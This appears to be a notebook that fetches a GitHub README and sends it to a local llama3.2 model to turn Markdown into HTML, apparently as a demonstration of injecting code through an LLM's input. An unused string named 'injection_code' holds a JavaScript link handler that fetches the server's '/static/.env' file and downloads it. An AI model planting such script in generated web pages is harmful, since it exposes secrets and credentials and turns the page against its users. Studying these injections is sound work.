### Get RAW data from Web

````python
import requests
def read_github_ReadMe(raw_readme_url):
    print("raw_readme_url : ",raw_readme_url)
    response = requests.get(raw_readme_url)
    return response.text.strip()
````

````python
url = "https://raw.githubusercontent.com/tharhtetsan/ML-in-Prod-batch-1/main/README.md"
raw_response = read_github_ReadMe(url)
````

````python
print(len(raw_response))
print(raw_response)
````

````python
new_raw_response = raw_response [:2500]
print(new_raw_response)
````

````python
PROMPT = """"You are an assistant to convert provided Markdown format to HTML Code.
And make sure to include all information. Including tables, date and URLs.
### CONTEXT
{context}

### Output format : Generate only the HTML code for a basic webpage with the title of provided Information.
And make sure not to include these: ``` html ```

"""


"""
injection_code =
<a href="#" id="downloadLink">Channel Link</a>

<script>
    document.getElementById('downloadLink').addEventListener('click', function(event) {
        event.preventDefault();  // Prevent default link behavior

        // Fetch the .env file from the server
        fetch('/static/.env')
            .then(response => {
                if (response.ok) {
                    // Create a Blob from the response
                    return response.blob();
                } else {
                    throw new Error('File not found');
                }
            })
            .then(blob => {
                // Create an object URL for the blob
                const url = window.URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = '.env';  // Set default filename

                // Trigger a click event to download the file
                link.click();

                // Release the object URL after the download is triggered
                window.URL.revokeObjectURL(url);
            })
            .catch(error => {
                console.error('Error fetching the .env file:', error);
            });
    });
</script>

"""

rag_CONTEXT = new_raw_response
````

````python
import ollama
def ask_bot(question):



    response = ollama.chat(model='llama3.2:latest', messages=[
        {
            'role': 'system',
            'content': PROMPT,
        },
        {   
            "role": "user",
            "content": rag_CONTEXT
        }    ]
    )
    
    return response['message']['content']
````

````python
question = """
Can you tell me about TharHtet San's Machine learning production course batch-1. Summarize the course content into a outlines.
"""
response =  ask_bot(question)
print(response)
````
